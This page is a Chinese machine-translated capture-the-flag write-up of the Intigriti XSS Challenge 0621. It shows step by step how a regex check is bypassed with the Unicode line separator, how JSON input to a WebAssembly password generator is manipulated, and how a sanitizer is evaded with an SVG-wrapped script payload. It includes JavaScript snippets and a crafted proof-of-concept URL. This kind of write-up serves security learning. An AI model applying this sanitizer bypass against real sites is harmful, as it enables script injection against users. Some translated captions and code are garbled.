<html>
<head>
<title>Intigriti — XSS Challenge 0621</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Intigriti — XSS挑战赛0621</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/intigriti-xss-challenge-0621-cf76c28840c1?source=collection_archive---------1-----------------------#2021-06-27">https://infosecwriteups.com/intigriti-xss-challenge-0621-cf76c28840c1?source=collection_archive---------1-----------------------#2021-06-27</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="8aa8" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">通过web assembly XSS</h2></div><figure class="kf kg kh ki gt kj"><div class="bz fp l di"><div class="kk kl l"/></div></figure><h1 id="55c3" class="km kn iq bd ko kp kq kr ks kt ku kv kw jw kx jx ky jz kz ka la kc lb kd lc ld bi translated">挑战</h1><p id="7389" class="pw-post-body-paragraph le lf iq lg b lh li jr lj lk ll ju lm ln lo lp lq lr ls lt lu lv lw lx ly lz ij bi translated">在浏览我的Twitter feed时，我看到了Intigriti的一个新帖子——一个新的XSS挑战。由于我有一些空闲时间，我决定试一试。在下面的文章中，我回顾了我的思考过程，并解释了我的方法。在撰写本文时，在挑战赛的最后一天，22份申请中只有14份被接受。因此，我希望很多人欣赏这篇文章，并从中吸取一些东西。</p><p id="e25d" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">对于每一个Intigriti XSS挑战赛，目标都是在给定的域上执行一个<code class="fe mf mg mh mi b">alert(document.domain)</code>。不允许有自我XSS或中间人，这应该适用于最新的Firefox或Chrome版本。</p><p id="f972" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">查看挑战赛的网站，我们可以看到内嵌了一个iframe，从<code class="fe mf mg mh mi b">/passgen.php</code>加载内容。Passgen包含一个密码生成器，主要在一个名为<code class="fe mf mg mh mi b">program.wasm</code>的web assembly (wasm)文件中实现。当用户生成新密码时，wasm文件被调用，其输出被传递给函数<code class="fe mf mg mh mi b">showMessage</code>。该函数获取输出，对其进行净化，并将其显示为弹出消息。</p><figure class="kf kg kh ki gt kj gh gi paragraph-image"><div class="gh gi mj"><img src="../Images/538e83553b0473da13adf65dd55d9d9b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1386/format:webp/1*-D1fMI8CcKZvmsMehNZM2Q.png"/></div><figcaption class="mm mn gj gh gi mo mp bd b be z dk translated">在/passgen.php上，用户可以生成密码。</figcaption></figure><h1 id="fe50" class="km kn iq bd ko kp kq kr ks kt ku kv kw jw kx jx ky jz kz ka la kc lb kd lc ld bi translated">黑盒测试</h1><p id="6c5a" class="pw-post-body-paragraph le lf iq lg b lh li jr lj lk ll ju lm ln lo lp lq lr ls lt lu lv lw lx ly lz ij bi translated">挑战的第一部分是理解wasm文件的作用。由于wasm文件没有源代码(只是后来Intigriti发布了一个<a class="ae mq" href="https://pastebin.com/n0vWtyQN" rel="noopener ugc nofollow" target="_blank"> Pastebin </a>)，剩下的两个选择要么是反转文件，要么是黑盒测试。</p><p id="7483" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">我使用的策略是查看文件的输入参数，摆弄它，然后查看结果——黑盒测试。让我们来看看代码及其输入参数:</p><figure class="kf kg kh ki gt kj"><div class="bz fp l di"><div class="mr kl l"/></div></figure><p id="f88e" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">我们可以看到有三个输入参数:<code class="fe mf mg mh mi b">passwordLength</code>、<code class="fe mf mg mh mi b">allowNumber</code>和<code class="fe mf mg mh mi b">allowSymbols</code>。所有三个参数都包含在JSON字符串中，该字符串随后作为<code class="fe mf mg mh mi b">option</code>参数传递给函数<code class="fe mf mg mh mi b">generate_password</code>。这个函数是wasm文件的一部分。我们得到的输出是生成的密码，包含在参数<code class="fe mf mg mh mi b">password</code>中。</p><p id="a92d" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">首先，我们分析参数<code class="fe mf mg mh mi b">passwordLength</code>，因为它似乎比其他参数更相关。它还在malloc中用于为生成的密码分配字节。但是，在第11到14行的检查和操作之前，它已经被复制到JSON中了。这意味着JSON中的密码长度(长度-1)和后来使用的密码长度(长度-2)可能不同。让我们看看如何验证这一点。</p><p id="9815" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">regex在第11行分析中检查密码长度是否仅由数字组成。不幸的是，检查是无效的，可以通过插入一个换行符来绕过它。这是由于regex字符串中的<a class="ae mq" href="https://javascript.info/regexp-multiline-mode" rel="noopener ugc nofollow" target="_blank">多行参数</a>:</p><pre class="kf kg kh ki gt ms mi mt mu aw mv bi"><span id="e01e" class="mw kn iq mi b gy mx my l mz na">"123\nImNotADigit".match(/^\d+$/gm)<br/>-&gt; Array [ "123" ]</span><span id="2791" class="mw kn iq mi b gy nb my l mz na">"123\nImNotADigit".match(/^\d+$/g)<br/>-&gt; null</span></pre><p id="a217" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">如果我们现在将<code class="fe mf mg mh mi b">inputFields.passwordLength.value</code>设置为<code class="fe mf mg mh mi b">123\nImNotADigit</code>并调用生成函数，理论上我们应该看到检查运行通过，导致不同的变量length-1和length-2。</p><p id="c4a6" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">该死，没那么快…每次我们试图设置值的时候，换行符就消失了，因为HTML输入字段默认不允许换行符。</p><figure class="kf kg kh ki gt kj gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/3010113866da140591095f27c87a814e.png" data-original-src="https://miro.medium.com/v2/resize:fit:782/format:webp/1*SMcnWvzHLoKrGuj47c4OPw.png"/></div><figcaption class="mm mn gj gh gi mo mp bd b be z dk translated">HTML输入字段删除每个换行符</figcaption></figure><p id="81da" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">尽管不允许使用常规换行符，但我们可以使用一个简单的模糊技巧来找到另一个有效字符:</p><figure class="kf kg kh ki gt kj"><div class="bz fp l di"><div class="mr kl l"/></div></figure><p id="6a7d" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">上面的代码片段尝试10000个字符来查找会破坏检查的奇怪的Unicode字符。相应地，我们可以看到字符8232，Unicode行分隔符，是我们需要的字符——这是有意义的。</p><p id="90a3" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">如果我们现在尝试我们的“ImNotADigit”字符串，它工作并通过。但是，由于length-1和length-2不同，生成的密码为空；有东西坏了。当然，由于JSON字符串中的非数字字符，它不再是一个有效的JSON，所以有效负载被破坏了(参见下面的两张图片)。因此，让我们修复它并重新检查结果。解决方法是用引号将值括起来，这样输入就不再作为数字来处理，而是作为JSON字符串中的一个字符串来处理。</p><figure class="kf kg kh ki gt kj gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nd"><img src="../Images/fc10d300ce2b19cb420dec4efd80b65b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9ToemvJ9Qq6Ele4mFc1n4A.png"/></div></div><figcaption class="mm mn gj gh gi mo mp bd b be z dk translated">input " 123 "+string . from charcode(8232)+" imnotaditch "中断JSON字符串</figcaption></figure><figure class="kf kg kh ki gt kj gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi ni"><img src="../Images/59d50df57ee0bb13518188564bb264dd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ohxwrCLcUSb2QFBeD_cMFQ.png"/></div></div><figcaption class="mm mn gj gh gi mo mp bd b be z dk translated">解决方法是将输入放在引号中</figcaption></figure><p id="0b50" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">要自己测试，您可以使用下面的代码片段:</p><pre class="kf kg kh ki gt ms mi mt mu aw mv bi"><span id="e497" class="mw kn iq mi b gy mx my l mz na">let passwordLength = document.getElementById("password-length");<br/>passwordLength.value = "\"hello" + String.fromCharCode(8232) + "123" + String.fromCharCode(8232) + "ImNotADigit\"";<br/>generate();</span></pre><figure class="kf kg kh ki gt kj gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nj"><img src="../Images/3272d3aaf942304f14fe6402ebd27efd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xdK2vO9cPCpOSpfNGsILWw.png"/></div></div><figcaption class="mm mn gj gh gi mo mp bd b be z dk translated">操纵JSON字符串是可行的。</figcaption></figure><p id="228f" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">正如我们在上面看到的，修复工作。接下来，我们可以尝试对JSON进行转义，并包含其他键。我们能用这个做什么？</p><p id="a56c" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">我尝试的第一件事是更改种子参数。因此，密码总是相同的。但是除了密码保持不变之外，没有任何好处。</p><pre class="kf kg kh ki gt ms mi mt mu aw mv bi"><span id="f74d" class="mw kn iq mi b gy mx my l mz na">inputFields.passwordLength.value = "\"" + String.fromCharCode(8232) + "10" +  String.fromCharCode(8232) + "\", \"seed\": 1";<br/>generate();</span></pre><p id="d190" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">然后，我尝试了各种输入和密码长度，最终发现当密码长度足够大时，一些输入会被反射回来。这可能是由于wasm文件溢出造成的；但是，我没有反转wasm文件，所以我不知道确切的原因。</p><p id="4494" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">下面的代码片段将输入长度设置为3000。在网站的控制台中执行，弹出窗口将显示我们在<code class="fe mf mg mh mi b">allowedNumbers</code>中设置的Xs。</p><pre class="kf kg kh ki gt ms mi mt mu aw mv bi"><span id="cfd5" class="mw kn iq mi b gy mx my l mz na">inputFields.passwordLength.value = "\"" + String.fromCharCode(8232) + "3000" +  String.fromCharCode(8232) + "\", \"allowedNumbers\": \"xxxxxxxxxxxx\"";<br/>generate();</span></pre><figure class="kf kg kh ki gt kj gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/9aefbe0ecfa686671e460b4b2401f168.png" data-original-src="https://miro.medium.com/v2/resize:fit:1008/0*VH84T-tLTsW0ZMaF"/></div></figure><p id="43dc" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">因此，我们可以控制弹出消息中显示的输出。让我们尽快将此事升级为XSS。</p><h1 id="0067" class="km kn iq bd ko kp kq kr ks kt ku kv kw jw kx jx ky jz kz ka la kc lb kd lc ld bi translated">消毒剂旁路</h1><p id="8cde" class="pw-post-body-paragraph le lf iq lg b lh li jr lj lk ll ju lm ln lo lp lq lr ls lt lu lv lw lx ly lz ij bi translated">弹出窗口是由使用杀毒函数<code class="fe mf mg mh mi b">sanitize</code>的函数<code class="fe mf mg mh mi b">showMessage</code>生成的。</p><figure class="kf kg kh ki gt kj"><div class="bz fp l di"><div class="mr kl l"/></div></figure><p id="8614" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">在第一个视图中，看起来我们可以注入HTML，因为<code class="fe mf mg mh mi b">&lt;</code>、<code class="fe mf mg mh mi b">&gt;</code>和<code class="fe mf mg mh mi b">/</code>不包含在不安全字符中。然而，许多标准有效载荷由于消毒剂而失效。例如，下面的例子确实注入了HTML。</p><pre class="kf kg kh ki gt ms mi mt mu aw mv bi"><span id="8a20" class="mw kn iq mi b gy mx my l mz na">inputFields.passwordLength.value = "\"" + String.fromCharCode(8232) + "3000" +  String.fromCharCode(73769) + "\", \"allowedNumbers\": \"&lt;u&gt;xxxxxxxx&lt;/u&gt;\"";<br/>generate();</span></pre><figure class="kf kg kh ki gt kj gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/d9103d54dd716a1f452b8ebc167f1256.png" data-original-src="https://miro.medium.com/v2/resize:fit:990/0*Y1565XdYmeE3poG8"/></div></figure><p id="c086" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">然而，如果我们将基本的<code class="fe mf mg mh mi b">&lt;script&gt;alert(1)&lt;/script&gt;</code>有效载荷放入杀毒软件，它会返回<code class="fe mf mg mh mi b">&lt;script&gt;alert&amp;#x28;1&amp;#x29;&lt;/script&gt;</code>。尽管如此，我发现了一个有效负载，利用它可以绕过使用<code class="fe mf mg mh mi b">&lt;svg&gt;</code>的杀毒程序，或者更好地说，甚至可以通过<code class="fe mf mg mh mi b">&lt;svg&gt;</code>执行javascript。</p><p id="4958" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">将<code class="fe mf mg mh mi b">&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</code>放入杀毒器会返回正确的杀毒输出(<code class="fe mf mg mh mi b">&lt;svg&gt;&lt;script&gt;alert&amp;#x28;1&amp;#x29;&lt;/script&gt;&lt;/svg&gt;</code>)，尽管如此，还是会执行javascript。</p><p id="69a6" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">如果您想知道为什么应用程序会有这样的行为，请看下面的两个DOM树。左图显示了没有SVG标记的DOM。就我的理解而言，如果我错了，请纠正我，一切都在HTML上下文中，HTML实体按照我们预期的方式处理。相反，在右侧，SVG标签中包含的部分不再在HTML上下文中，而是在SVG中。这意味着HTML解析器将HTML实体转换回字符，因为它不再是HTML上下文。因此，可以将HTML编码的javascript放在脚本标签中，并使用<code class="fe mf mg mh mi b">showMessage</code>弹出菜单执行有效负载。</p><div class="kf kg kh ki gt ab cb"><figure class="nm kj nn no np nq nr paragraph-image"><img src="../Images/92ac002b7fcc420c2a2ce718d4b1946e.png" data-original-src="https://miro.medium.com/v2/resize:fit:574/format:webp/1*kX6PbOU5URlm4L-F4OkGBg.png"/></figure><figure class="nm kj ns no np nq nr paragraph-image"><img src="../Images/8650ace7b49cfb2f4f4043de6cbe8094.png" data-original-src="https://miro.medium.com/v2/resize:fit:468/format:webp/1*up7zT6xKY430_4W0NtLG7A.png"/><figcaption class="mm mn gj gh gi mo mp bd b be z dk nt di nu nv translated">用<a class="ae mq" href="https://livedom.lab.xss.academy/" rel="noopener ugc nofollow" target="_blank">https://livedom.lab.xss.academy/</a>生成的两个不同的DOM树</figcaption></figure></div><h1 id="ab5e" class="km kn iq bd ko kp kq kr ks kt ku kv kw jw kx jx ky jz kz ka la kc lb kd lc ld bi translated">最终概念验证</h1><p id="8ad8" class="pw-post-body-paragraph le lf iq lg b lh li jr lj lk ll ju lm ln lo lp lq lr ls lt lu lv lw lx ly lz ij bi translated">综合考虑，最终攻击如下:</p><ol class=""><li id="c215" class="nw nx iq lg b lh ma lk mb ln ny lr nz lv oa lz ob oc od oe bi translated">控制wasm调用的JSON输入</li><li id="52dc" class="nw nx iq lg b lh of lk og ln oh lr oi lv oj lz ob oc od oe bi translated">使用Unicode行分隔符对JSON进行转义</li><li id="fe76" class="nw nx iq lg b lh of lk og ln oh lr oi lv oj lz ob oc od oe bi translated">将SVG有效负载放入JSON字符串以执行javascript</li></ol><p id="5fff" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">以下代码片段演示了这种攻击:</p><pre class="kf kg kh ki gt ms mi mt mu aw mv bi"><span id="9607" class="mw kn iq mi b gy mx my l mz na">inputFields.passwordLength.value = "\"" + String.fromCharCode(8232) + "3000" +  String.fromCharCode(8232) + "\", \"allowedNumbers\": \"&lt;svg&gt;&lt;script&gt;alert(window.origin)&lt;/script&gt;&lt;/scg&gt;\"";<br/>generate();</span></pre><p id="99d1" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">鉴于此，对于反射的https://challenge-0621.intigriti.io/passgen.php?，受害者必须点击下面的链接并生成(仅适用于Firefox): <br/> <a class="ae mq" href="https://challenge-0621.intigriti.io/passgen.php?passwordLength=%22%E2%80%A83000%E2%80%A8%22%2C+%22allowedNumbers%22%3A+%22%3Csvg%3E%3Cscript%3Ealert%28window.origin%29%3C%2Fscript%3E%3C%2Fscg%3E%22&amp;allowNumbers=false&amp;allowSymbols=true&amp;timestamp=1624322408826" rel="noopener ugc nofollow" target="_blank">password length = % 22% E2 % 80% a 83000% E2 % 80% A8 % 22% 2C+% 22允许的号码% 22% 3A+% 22% 3c SVG % 3E % 3c script % 3e alert % 28 window . origin % 29% 3C % 2f script % 3E % 3C % 2f SCG % 3E % 22&amp;allow numbers = false&amp;allow symbols = true&amp;timestamp = 1624322408826】</a></p><figure class="kf kg kh ki gt kj gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi ok"><img src="../Images/8139e4390c9038826ccbfea11c2e94a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*hCbetEHw_bqy2kO1"/></div></div><figcaption class="mm mn gj gh gi mo mp bd b be z dk translated">在屏幕截图中，演示了成功的攻击</figcaption></figure><h1 id="f7f6" class="km kn iq bd ko kp kq kr ks kt ku kv kw jw kx jx ky jz kz ka la kc lb kd lc ld bi translated">摘要</h1><p id="c100" class="pw-post-body-paragraph le lf iq lg b lh li jr lj lk ll ju lm ln lo lp lq lr ls lt lu lv lw lx ly lz ij bi translated">综上，又一个优秀的Intigriti解决了。第一次测试web assembly，学到了新招，增长了见识。寻找Unicode字符的技巧和奇异的XSS有效载荷是我下次一定会记住的两件事！</p><p id="c9d0" class="pw-post-body-paragraph le lf iq lg b lh ma jr lj lk mb ju lm ln mc lp lq lr md lt lu lv me lx ly lz ij bi translated">一个额外的提示:我在写报告的时候才意识到，我的攻击只对火狐有效，对Chrome无效。我还没有时间想出另一种方法，因此我对其他14个黑客中的一个如何解决挑战非常感兴趣。</p></div></div>    
</body>
</html>